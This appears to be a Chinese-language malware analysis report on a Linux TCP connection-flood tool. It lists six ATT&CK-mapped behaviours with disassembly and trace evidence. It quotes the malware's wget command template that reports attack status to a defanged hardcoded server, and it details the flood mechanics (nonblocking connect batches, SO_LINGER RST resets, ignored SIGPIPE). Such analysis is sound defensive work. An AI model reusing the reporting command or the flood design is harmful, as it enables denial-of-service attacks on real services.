## 行为分析

共 **6** 条行为，每条都挂了证据；其中 **2** 条静态可得、**4** 条经动态分析取得。

### 1. 解析目标与时长参数

`T1498` · 置信度 **高** · 静态

程序要求 argc>=4，从命令行读取 argv[1]=目标 IP(inet_pton 校验)、argv[2]=目标端口(atoi/htons)、argv[3]=持续秒数、argv[4]=线程上限、argv[5]=标签；标签中的 '.' 会被替换为 '-'，随后用于拼接上报路径。

> **证据**：main @0x3c0；call atoi(rva 0x1929)、inet_pton(rva 0xfbc)、htons(rva 0xfb7)，未满足参数时直接 return 1/2
> 
> **来源**：`ref:f6dbd8750f` · `ref:0dc4ae60fc`

### 2. 经 shell 发起回连上报

`T1071.001` · 置信度 **高** · 动态

用 snprintf 拼接 "wget -O /dev/null hxxp://45.198.224[.]130/r/%s-%s-%ld >/dev/null 2>&1 &"，再交给 system 执行，从而派生 /bin/sh -c 与 wget 子进程向硬编码 HTTP 端点上报攻击状态；运行日志中可见 wget 请求 /r/cf0-testname-0 并尝试连接 45.198.224[.]130:80。

> **证据**：.rodata 0x48c0="cf0"、0x48c4="cf1"、0x48c8 为 wget 模板；main 调 snprintf(rva 0x176c) 后调 system(rva 0x12bf)；动态跟踪 write(2, "--...-- hxxp://45.198.224[.]130/r/cf0-testname-0") 并 connect(45.198.224[.]130:80) 返回 ENETUNREACH
> 
> **来源**：`ref:f56074ec03` · `ref:f6dbd8750f` · `ref:71ae78a6ce`

### 3. 发起 TCP 连接洪泛

`T1498.001` · 置信度 **高** · 动态

按批次循环执行 socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK) 并 connect 到目标 IP:端口；每批最多 min(500, 线程上限/50) 个套接字，用于耗尽目标连接资源或占用服务端连接表。

> **证据**：main @0x3c0 内层循环；socket(rva 0x1227)、connect(rva 0xf89)；动态跟踪连续出现 socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK) 与 connect(127.0.0[.]1:9) 事件（测试参数）
> 
> **来源**：`ref:f6dbd8750f` · `ref:71ae78a6ce`

### 4. RST 快速回收连接

`T1498.001` · 置信度 **高** · 动态

每个套接字在 connect 前设置 SO_LINGER {l_onoff=1, l_linger=0}，使 close 时直接发送 RST；每批连接保持 20ms 后逐个 close，再进入下一批，从而以较高频率反复重建/丢弃连接。

> **证据**：main 中 setsockopt(rva 0x1203, SOL_SOCKET, SO_LINGER, 8 字节 {0x01,0,0,0,0,0,0,0}) 与 close(rva 0x1c0d)；动态跟踪 setsockopt(..., SO_LINGER, {l_onoff=1, l_linger=0}) 及随后 close
> 
> **来源**：`ref:f6dbd8750f` · `ref:71ae78a6ce`

### 5. 到期补报攻击计数

`T1071.001` · 置信度 **高** · 静态

主循环以 time 比较起始时间与持续秒数，到期后再拼接一次 wget 上报，路径使用 "cf1" 前缀并带上累计尝试次数计数器，随后 return 0 结束。

> **证据**：main 中 time(rva 0x1be6)、局部计数器 local_1c8、第二次 snprintf 使用 .rodata 0x48c4("cf1")；字符串扫描命中完整模板 off 18632
> 
> **来源**：`ref:f6dbd8750f` · `ref:f56074ec03`

### 6. 忽略 SIGPIPE 保活

`T1498` · 置信度 **高** · 动态

启动时把 SIGPIPE(13) 设为忽略，避免大量非阻塞套接字写失败导致进程被信号终止，保证洪泛循环持续到设定时长。

> **证据**：main 首部 signal(0xd, SIG_IGN)，反汇编可见 mov edi, 0xd 后 call rva 0x16e9；动态跟踪 rt_sigaction(SIGPIPE, SIG_IGN)
> 
> **来源**：`ref:0dc4ae60fc` · `ref:71ae78a6ce`
